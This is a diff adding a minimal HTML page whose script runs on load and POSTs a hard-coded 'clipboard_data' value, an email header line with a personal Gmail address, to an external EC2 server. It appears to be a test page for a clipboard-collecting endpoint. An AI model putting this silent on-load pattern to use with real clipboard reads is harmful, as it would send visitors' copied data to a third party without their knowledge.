@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="jquery.min.js">
+</script>
+<script>
+function abc(){
+    $.post("http://ec2-54-254-97-253.ap-southeast-1.compute.amazonaws.com:8000/post",
+    {
+      clipboard_data:"Delivered-To: rauf.ridzuan@gmail.com"
+    },
+    function(data,status){
+      console.log("Data: " + data + "\nStatus: " + status);
+    },
+    'json');
+  };
+abc();
+</script>
+</head>
+<body>
+
+</body>
+</html>
